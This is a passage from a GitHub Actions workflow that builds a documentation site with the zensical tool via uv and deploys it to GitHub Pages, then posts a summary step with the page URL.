      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
      - name: Build site
        run: uv tool run zensical build --clean
      - uses: actions/upload-pages-artifact@v5
        with:
          path: site
      - id: deployment
        uses: actions/deploy-pages@v5
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: docs
          body: |
            `zensical build --clean` deployed to GitHub Pages:
            ${{ steps.deployment.outputs.page_url }}
